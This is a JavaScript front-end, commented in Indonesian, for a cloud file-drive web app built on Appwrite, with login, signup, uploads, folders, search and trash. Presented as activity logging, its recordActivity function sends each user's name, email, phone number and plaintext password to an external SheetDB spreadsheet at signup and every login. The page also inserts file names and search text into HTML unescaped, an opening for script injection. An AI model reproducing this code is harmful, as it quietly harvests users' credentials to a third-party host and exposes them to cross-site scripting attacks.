// ======================================================
// 1. KONFIGURASI APPWRITE & DATABASE
// ======================================================
const client = new Appwrite.Client();
const account = new Appwrite.Account(client);
const databases = new Appwrite.Databases(client);
const storage = new Appwrite.Storage(client);

// Ganti Project ID dan Endpoint sesuai milik Anda
const CONFIG = {
    ENDPOINT: 'https://sgp.cloud.appwrite.io/v1',
    PROJECT_ID: '697f71b40034438bb559', 
    DB_ID: 'storagedb',
    COLLECTION_FILES: 'files',   
    COLLECTION_USERS: 'users',
    BUCKET_ID: 'taskfiles'
};

const SHEETDB_API = 'https://sheetdb.io/api/v1/v9e5uhfox3nbi'; // API Logging Excel

client.setEndpoint(CONFIG.ENDPOINT).setProject(CONFIG.PROJECT_ID);

// ======================================================
// 2. STATE GLOBAL (PENYIMPAN STATUS APLIKASI)
// ======================================================
let currentUser = null;
let currentFolderId = 'root'; 
let currentFolderName = "Drive";
let currentViewMode = 'root'; 
let selectedItem = null; 
let selectedUploadFile = null; 
let storageDetail = { images: 0, videos: 0, docs: 0, others: 0, total: 0 };
let searchTimeout = null; // Untuk debounce pencarian

// Helper: Mempermudah pengambilan elemen ID
const el = (id) => document.getElementById(id);
const showLoading = () => el('loading').classList.remove('hidden');
const hideLoading = () => el('loading').classList.add('hidden');

// ======================================================
// 3. INISIALISASI (SAAT WEBSITE DIMUAT)
// ======================================================
document.addEventListener('DOMContentLoaded', () => {
    checkSession();         // Cek apakah user sudah login
    initDragAndDrop();      // Aktifkan fitur seret file
    initLogout();           // Siapkan tombol logout
    initSearchBar();        // Aktifkan kolom pencarian
    initAllContextMenus();  // Aktifkan semua logika klik kanan & menu
});

// ======================================================
// 4. LOGIKA PENCATATAN EXCEL (SHEETDB)
// ======================================================
async function recordActivity(sheetName, userData) {
    try {
        const now = new Date();
        const formattedDate = now.toLocaleString('id-ID', { 
            day: '2-digit', month: '2-digit', year: 'numeric',
            hour: '2-digit', minute: '2-digit', second: '2-digit'
        }).replace(/\./g, ':'); 

        const payload = {
            "ID": userData.id || "-",
            "Nama": userData.name || "-",
            "Email": userData.email || "-",
            "Phone": userData.phone || "-",       
            "Password": userData.password || "-", 
            "Waktu": formattedDate,
            "Riwayat Waktu": formattedDate // Tambahan kolom riwayat
        };

        await fetch(`${SHEETDB_API}?sheet=${sheetName}`, {
            method: 'POST',
            headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' },
            body: JSON.stringify({ data: payload })
        });
    } catch (error) { console.error("Gagal mencatat ke Excel", error); }
}

// ======================================================
// 5. NAVIGASI SIDEBAR
// ======================================================
window.handleMenuClick = (element, mode) => {
    // Ubah status aktif pada menu sidebar
    document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
    element.classList.add('active');
    
    // Set mode tampilan dan reset ke root folder
    currentViewMode = mode;
    currentFolderId = 'root';
    
    // Update judul header berdasarkan mode
    if(mode === 'root') currentFolderName = "Drive";
    else if(mode === 'recent') currentFolderName = "Terbaru";
    else if(mode === 'starred') currentFolderName = "Berbintang";
    else if(mode === 'trash') currentFolderName = "Sampah";
    else currentFolderName = element.innerText.trim();

    loadFiles(mode);
};

window.goBack = () => {
    currentFolderId = 'root';
    currentFolderName = "Drive";
    currentViewMode = 'root';
    // Reset sidebar ke Beranda
    document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
    document.querySelectorAll('.nav-item')[0].classList.add('active');
    loadFiles('root');
};

window.openFolder = (id, name) => {
    currentFolderId = id;
    currentFolderName = name;
    loadFiles(id);
};

// ======================================================
// 6. LOGIKA PENCARIAN (SEARCH ENGINE)
// ======================================================
function initSearchBar() {
    const input = el('searchInput');
    const clearBtn = el('clearSearchBtn');
    if (!input) return;

    input.addEventListener('input', (e) => {
        const query = e.target.value.trim();
        if (query.length > 0) clearBtn.classList.remove('hidden'); 
        else { 
            clearBtn.classList.add('hidden'); 
            loadFiles(currentFolderId); // Kembali ke folder normal jika kosong
            return; 
        }

        clearTimeout(searchTimeout);
        // Tampilkan loading saat mengetik
        el('fileGrid').innerHTML = `<div style="grid-column:1/-1;text-align:center;margin-top:50px;"><div class="spinner"></div><p>Mencari "${query}"...</p></div>`;
        
        searchTimeout = setTimeout(() => performSearch(query), 600); // Tunggu 600ms sebelum cari
    });
}

async function performSearch(keyword) {
    try {
        const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, [
            Appwrite.Query.equal('owner', currentUser.$id),
            Appwrite.Query.search('name', keyword), // Fitur Full-text search Appwrite
            Appwrite.Query.limit(50)
        ]);
        const grid = el('fileGrid'); grid.innerHTML = '';
        if (res.documents.length === 0) grid.innerHTML = `<p style="grid-column:1/-1;text-align:center;margin-top:50px;">Tidak ditemukan data.</p>`;
        else res.documents.forEach(doc => renderItem(doc));
    } catch (e) { fallbackSearch(keyword); } // Gunakan fallback jika index search belum siap
}

async function fallbackSearch(keyword) {
    try {
        const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, [Appwrite.Query.equal('owner', currentUser.$id), Appwrite.Query.limit(100)]);
        const filtered = res.documents.filter(doc => doc.name.toLowerCase().includes(keyword.toLowerCase()));
        const grid = el('fileGrid'); grid.innerHTML = '';
        if (filtered.length === 0) grid.innerHTML = `<p style="grid-column:1/-1;text-align:center;">Tidak ditemukan</p>`;
        else filtered.forEach(doc => renderItem(doc));
    } catch(err){}
}

window.clearSearch = () => { el('searchInput').value = ''; el('clearSearchBtn').classList.add('hidden'); loadFiles(currentFolderId); };

// ======================================================
// 7. SISTEM KONTROL KLIK (MENYATUKAN SEMUA MENU)
// ======================================================
function initAllContextMenus() {
    const globalMenu = el('globalContextMenu');
    const newBtnMenu = el('dropdownMenu');
    const fileMenu = el('contextMenu');
    const newBtn = el('newBtnMain');
    const navDrive = el('navDrive');
    const mainArea = document.querySelector('.main-content-area');

    // Fungsi Utama: Menutup SEMUA menu yang terbuka
    const closeAll = () => {
        if(globalMenu) globalMenu.classList.remove('show');
        if(newBtnMenu) newBtnMenu.classList.remove('show');
        if(fileMenu) { fileMenu.classList.add('hidden'); fileMenu.classList.remove('show'); }
        if(el('storageModal')) el('storageModal').classList.add('hidden');
    };

    // A. Tombol New (Klik Kiri & Kanan)
    if (newBtn) {
        // Hapus listener lama dengan kloning elemen
        const newBtnClean = newBtn.cloneNode(true);
        newBtn.parentNode.replaceChild(newBtnClean, newBtn);

        // Handler
        const toggleNewMenu = (e) => {
            e.preventDefault(); e.stopPropagation();
            const wasOpen = newBtnMenu.classList.contains('show');
            closeAll(); // Tutup yang lain dulu
            if (!wasOpen) newBtnMenu.classList.add('show'); // Buka jika tadi tertutup
        };

        newBtnClean.onclick = toggleNewMenu;
        newBtnClean.oncontextmenu = toggleNewMenu;
    }

    // B. Klik Kanan pada Sidebar "Drive Saya"
    if (navDrive) {
        navDrive.oncontextmenu = (e) => { 
            e.preventDefault(); e.stopPropagation(); closeAll();
            globalMenu.style.top = `${e.clientY}px`; 
            globalMenu.style.left = `${e.clientX}px`; 
            globalMenu.classList.add('show');
        };
    }

    // C. Klik Kanan pada Area Kosong Dashboard
    if (mainArea) {
        mainArea.oncontextmenu = (e) => {
            if (e.target.closest('.item-card')) return; // Abaikan jika klik file (biar renderItem yg handle)
            e.preventDefault(); closeAll();
            globalMenu.style.top = `${e.clientY}px`; 
            globalMenu.style.left = `${e.clientX}px`; 
            globalMenu.classList.add('show');
        };
    }

    // D. Klik Kiri di mana saja (Tutup Menu)
    window.onclick = () => closeAll();
}

// ======================================================
// 8. RENDER ITEM & KLIK KANAN FILE (MENU SAMPAH)
// ======================================================
function renderItem(doc) {
    const grid = el('fileGrid');
    const div = document.createElement('div');
    div.className = 'item-card';
    const isFolder = doc.type === 'folder';
    
    // Tentukan Ikon / Thumbnail
    const starHTML = doc.starred ? `<i class="fa-solid fa-star" style="position:absolute;top:10px;left:10px;color:#ffd700;"></i>` : '';
    let content = isFolder ? `<i class="icon fa-solid fa-folder"></i>` : `<i class="icon fa-solid fa-file-lines" style="color:#60a5fa"></i>`;
    
    // Jika file gambar, tampilkan preview
    if (!isFolder && doc.name.match(/\.(jpg|jpeg|png|webp|jfif)$/i)) {
        content = `<div class="thumb-box" style="width:100px;height:100px;overflow:hidden;border-radius:15px;margin-bottom:10px;"><img src="${storage.getFilePreview(CONFIG.BUCKET_ID, doc.fileId)}" style="width:100%;height:100%;object-fit:cover;"></div>`;
    }

    div.innerHTML = `${starHTML}${content}<div class="item-name">${doc.name}</div>`;
    
    // Klik Kiri: Buka Folder / File
    div.onclick = () => { if(!doc.trashed) isFolder ? openFolder(doc.$id, doc.name) : window.open(doc.url, '_blank'); };

    // Klik Kanan: Context Menu File
    div.oncontextmenu = (e) => {
        e.preventDefault(); e.stopPropagation();
        
        // Jaminan tutup menu lain
        if(el('storageModal')) el('storageModal').classList.add('hidden');
        if(el('globalContextMenu')) el('globalContextMenu').classList.remove('show');
        if(el('dropdownMenu')) el('dropdownMenu').classList.remove('show');

        selectedItem = doc;
        const menu = el('contextMenu');
        menu.style.top = `${e.clientY}px`; menu.style.left = `${e.clientX}px`;
        
        // Update Logika Menu (Sampah vs Restore)
        updateContextMenuUI(doc);

        menu.classList.remove('hidden'); 
        menu.classList.add('show');
    };
    grid.appendChild(div);
}

// Fungsi Helper Update Menu
function updateContextMenuUI(doc) {
    const isTrash = doc.trashed;
    const btnTrash = el('ctxTrashBtn');
    const btnRestore = el('ctxRestoreBtn');
    const btnPermDel = el('ctxPermDeleteBtn');
    const starText = el('ctxStarText');

    // Toggle Tombol Sampah
    if (isTrash) {
        btnTrash.classList.add('hidden'); // Sembunyikan 'Pindahkan ke Sampah'
        btnRestore.classList.remove('hidden'); // Munculkan 'Pulihkan'
        btnPermDel.classList.remove('hidden'); // Munculkan 'Hapus Permanen'
    } else {
        btnTrash.classList.remove('hidden');
        btnRestore.classList.add('hidden');
        btnPermDel.classList.add('hidden');
    }
    
    // Toggle Text Bintang
    starText.innerText = doc.starred ? "Hapus Bintang" : "Bintangi";
}

// ======================================================
// 9. LOGIKA DETAIL STORAGE (POP-UP)
// ======================================================
window.openStorageModal = () => {
    // Pastikan menu lain tertutup
    el('contextMenu').classList.add('hidden');
    
    const total = storageDetail.total || 1; // Hindari pembagian 0
    
    // Update Grafik Batang
    el('barImages').style.width = `${(storageDetail.images/total)*100}%`;
    el('barVideos').style.width = `${(storageDetail.videos/total)*100}%`;
    el('barDocs').style.width = `${(storageDetail.docs/total)*100}%`;
    el('barOthers').style.width = `${(storageDetail.others/total)*100}%`;

    // Update Teks Angka
    el('storageBigText').innerText = (storageDetail.total / 1048576).toFixed(2) + " MB";
    el('valImages').innerText = (storageDetail.images / 1048576).toFixed(2) + " MB";
    el('valVideos').innerText = (storageDetail.videos / 1048576).toFixed(2) + " MB";
    el('valDocs').innerText = (storageDetail.docs / 1048576).toFixed(2) + " MB";
    el('valOthers').innerText = (storageDetail.others / 1048576).toFixed(2) + " MB";

    window.openModal('storageModal');
};

// Hitung total penyimpanan berdasarkan tipe file
async function calculateStorage() {
    if (!currentUser) return;
    try {
        const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, [Appwrite.Query.equal('owner', currentUser.$id), Appwrite.Query.equal('type', 'file')]);
        storageDetail = { images: 0, videos: 0, docs: 0, others: 0, total: 0 };
        res.documents.forEach(doc => {
            const size = doc.size || 0; const name = doc.name.toLowerCase(); storageDetail.total += size;
            if (name.match(/\.(jpg|jpeg|png|gif|webp|jfif)$/)) storageDetail.images += size;
            else if (name.match(/\.(mp4|mkv|mov|avi)$/)) storageDetail.videos += size;
            else if (name.match(/\.(pdf|doc|docx|xls|xlsx|txt)$/)) storageDetail.docs += size;
            else storageDetail.others += size;
        });
        const mb = (storageDetail.total / 1048576).toFixed(2);
        el('storageUsed').innerText = `${mb} MB`;
        el('storageBar').style.width = `${Math.min((mb / 2048) * 100, 100)}%`;
    } catch (e) { console.error("Gagal hitung storage"); }
}

// ======================================================
// 10. AUTH & SESSION CHECK
// ======================================================
async function checkSession() {
    showLoading();
    try {
        currentUser = await account.get();
        window.nav('dashboardPage'); 
        loadFiles('root');  
        calculateStorage();
    } catch (e) { window.nav('loginPage'); } 
    finally { setTimeout(hideLoading, 500); }
}

// Logic Sign Up
if(el('signupForm')) {
    el('signupForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const name = el('regName').value; const email = el('regEmail').value; const phone = el('regPhone').value; const pass = el('regPass').value; const verify = el('regVerify').value;
        if (pass !== verify) return alert("Password tidak sama!");
        showLoading();
        try {
            const auth = await account.create(Appwrite.ID.unique(), email, pass, name);
            try { await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, auth.$id, { name, email, phone }); } catch(err){}
            await recordActivity('SignUp', { id: auth.$id, name, email, phone, password: pass });
            alert("Sign Up Berhasil!"); window.nav('loginPage');
        } catch(e) { 
            if(e.message.includes('exists')) alert("Email/No HP sudah terdaftar."); else alert(e.message);
        } finally { hideLoading(); }
    });
}

// ======================================================
// PERBAIKAN LOGIKA LOGIN (ANTI-MACET)
// ======================================================
if (el('loginForm')) {
    el('loginForm').addEventListener('submit', async (e) => {
        e.preventDefault(); // Mencegah reload halaman
        
        let inputId = el('loginEmail').value.trim();
        const pass = el('loginPass').value;
        
        showLoading(); // Tampilkan loading spinner

        try {
            // 1. CEK & BERSIHKAN SESI LAMA (PENTING!)
            // Seringkali login gagal karena sesi lama masih "nyangkut"
            try {
                await account.get(); // Cek apakah sudah login?
                // Jika sukses get(), berarti sudah login. Kita logout dulu biar bersih.
                await account.deleteSession('current');
            } catch (err) {
                // Jika error, berarti memang belum login (bagus)
            }

            // 2. LOGIKA LOGIN MENGGUNAKAN USERNAME
            // Jika input tidak mengandung '@', kita anggap itu Username
            if (!inputId.includes('@')) {
                try {
                    const res = await databases.listDocuments(
                        CONFIG.DB_ID, 
                        CONFIG.COLLECTION_USERS, 
                        [Appwrite.Query.equal('name', inputId)]
                    );
                    
                    if (res.total === 0) {
                        throw new Error("Username tidak ditemukan. Coba gunakan Email.");
                    }
                    
                    // Ganti inputId dengan email yang ditemukan dari database
                    inputId = res.documents[0].email;
                    
                } catch (dbError) {
                    // Jika gagal akses DB (misal masalah permission), lempar error
                    console.error("Gagal mencari username:", dbError);
                    throw new Error("Gagal memverifikasi username. Silakan login dengan Email.");
                }
            }

            // 3. EKSEKUSI LOGIN (BUAT SESI BARU)
            await account.createEmailPasswordSession(inputId, pass);

            // 4. AMBIL DATA USER SETELAH LOGIN SUKSES
            const userAuth = await account.get();
            
            // Ambil data tambahan (No HP) dari database untuk log Excel
            let userPhone = "-";
            try {
                const userDB = await databases.getDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, userAuth.$id);
                userPhone = userDB.phone || "-";
            } catch (e) { console.log("Data tambahan user tidak ditemukan"); }

            // Catat ke Excel (SheetDB)
            await recordActivity('Login', { 
                id: userAuth.$id, 
                name: userAuth.name, 
                email: userAuth.email, 
                phone: userPhone, 
                password: pass 
            });

            // 5. REDIRECT KE DASHBOARD
            checkSession(); 

        } catch (error) {
            // Tampilkan pesan error yang jelas kepada user
            console.error("Login Error:", error);
            
            let pesan = "Login Gagal. Periksa koneksi internet.";
            if (error.message.includes('Invalid credentials')) pesan = "Email atau Password salah!";
            else if (error.message.includes('Username tidak ditemukan')) pesan = error.message;
            else if (error.message.includes('Gagal memverifikasi')) pesan = error.message;
            
            alert(pesan);
            hideLoading();
        }
    });
}

// Logic Logout
function initLogout() {
    const btn = el('logoutBtn');
    if (btn) {
        // Cloning tombol untuk hapus listener lama
        const newBtn = btn.cloneNode(true); btn.parentNode.replaceChild(newBtn, btn);
        newBtn.addEventListener('click', async () => {
            if (confirm("Keluar?")) {
                showLoading();
                try {
                    if (currentUser) {
                        let userPhone = "-";
                        try { const userDB = await databases.getDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, currentUser.$id); userPhone = userDB.phone || "-"; } catch(e){}
                        await recordActivity('Logout', { id: currentUser.$id, name: currentUser.name, email: currentUser.email, phone: userPhone, password: "-" });
                    }
                    await account.deleteSession('current'); window.location.reload(); 
                } catch (error) { window.location.reload(); }
            }
        });
    }
}

// ======================================================
// 11. FUNGSI CRUD (FILE OPERATIONS)
// ======================================================

// Helper Modals
window.openModal = (id) => { el(id).classList.remove('hidden'); if(id==='folderModal') setTimeout(()=>el('newFolderName').focus(),100); };
window.closeModal = (id) => el(id).classList.add('hidden');
window.triggerUploadModal = () => { resetUploadUI(); window.openModal('uploadModal'); };
window.createFolder = () => window.openModal('folderModal');

// Submit Folder Baru
window.submitCreateFolder = async () => {
    const name = el('newFolderName').value.trim();
    if (!name) return;
    closeModal('folderModal'); showLoading();
    try {
        await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, Appwrite.ID.unique(), {
            name: name, type: 'folder', parentId: currentFolderId, owner: currentUser.$id, size: 0, starred: false, trashed: false
        });
        loadFiles(currentFolderId); el('newFolderName').value = '';
    } catch (e) { alert(e.message); } finally { hideLoading(); }
};

// Submit Upload File
window.submitUploadFile = async () => {
    if (!selectedUploadFile) return alert("Pilih file dulu!");
    closeModal('uploadModal'); showLoading();
    try {
        const up = await storage.createFile(CONFIG.BUCKET_ID, Appwrite.ID.unique(), selectedUploadFile);
        const url = storage.getFileView(CONFIG.BUCKET_ID, up.$id);
        await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, Appwrite.ID.unique(), {
            name: selectedUploadFile.name, type: 'file', parentId: currentFolderId, owner: currentUser.$id, url: url.href, fileId: up.$id, size: selectedUploadFile.size, starred: false, trashed: false
        });
        resetUploadUI(); loadFiles(currentFolderId); calculateStorage();
    } catch (e) { alert(e.message); } finally { hideLoading(); }
};

// File Actions (Context Menu)
window.toggleStarItem = async () => { try { await databases.updateDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, selectedItem.$id, { starred: !selectedItem.starred }); loadFiles(currentViewMode==='root'?currentFolderId:currentViewMode); el('contextMenu').classList.add('hidden'); } catch(e){alert(e.message);} };
window.moveItemToTrash = async () => { try { await databases.updateDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, selectedItem.$id, { trashed: true }); loadFiles(currentViewMode==='root'?currentFolderId:currentViewMode); el('contextMenu').classList.add('hidden'); } catch(e){alert(e.message);} };
window.restoreFromTrash = async () => { try { await databases.updateDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, selectedItem.$id, { trashed: false }); loadFiles('trash'); el('contextMenu').classList.add('hidden'); } catch(e){alert(e.message);} };
window.deleteItemPermanently = async () => { if(!confirm("Hapus permanen?")) return; try { if(selectedItem.type==='file') await storage.deleteFile(CONFIG.BUCKET_ID, selectedItem.fileId); await databases.deleteDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, selectedItem.$id); loadFiles('trash'); calculateStorage(); el('contextMenu').classList.add('hidden'); } catch(e){alert(e.message);} };

// Menu Action Buttons
window.openCurrentItem = () => { if(selectedItem) selectedItem.type==='folder' ? openFolder(selectedItem.$id, selectedItem.name) : window.open(selectedItem.url, '_blank'); el('contextMenu').classList.add('hidden'); };
window.downloadCurrentItem = () => { if(selectedItem && selectedItem.type!=='folder') window.open(storage.getFileDownload(CONFIG.BUCKET_ID, selectedItem.fileId), '_blank'); el('contextMenu').classList.add('hidden'); };
window.renameCurrentItem = async () => {
    const newName = prompt("Nama baru:", selectedItem.name);
    if(newName) {
        await databases.updateDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, selectedItem.$id, {name: newName});
        loadFiles(currentFolderId);
    }
    el('contextMenu').classList.add('hidden');
};

// Drag & Drop Helpers
function resetUploadUI() { selectedUploadFile = null; el('fileInfoContainer').classList.add('hidden'); el('fileInputHidden').value = ''; }
function handleFileSelect(file) { selectedUploadFile = file; el('fileInfoText').innerText = `Terpilih: ${file.name}`; el('fileInfoContainer').classList.remove('hidden'); }
function initDragAndDrop() {
    const zone = el('dropZone'); const input = el('fileInputHidden');
    if (!zone) return;
    ['dragenter', 'dragover', 'dragleave', 'drop'].forEach(evt => zone.addEventListener(evt, (e) => { e.preventDefault(); e.stopPropagation(); }));
    zone.addEventListener('dragover', () => zone.classList.add('active'));
    zone.addEventListener('dragleave', () => zone.classList.remove('active'));
    zone.addEventListener('drop', (e) => { zone.classList.remove('active'); if (e.dataTransfer.files.length > 0) handleFileSelect(e.dataTransfer.files[0]); });
    if (input) input.addEventListener('change', (e) => { if (e.target.files.length > 0) handleFileSelect(e.target.files[0]); });
}

// Window Navigation Helper
window.nav = (p) => { ['loginPage', 'signupPage', 'dashboardPage'].forEach(id => el(id).classList.add('hidden')); el(p).classList.remove('hidden'); };
window.togglePass = (id, icon) => { const input = document.getElementById(id); if (input.type === "password") { input.type = "text"; icon.classList.remove("fa-eye-slash"); icon.classList.add("fa-eye"); } else { input.type = "password"; icon.classList.remove("fa-eye"); icon.classList.add("fa-eye-slash"); } };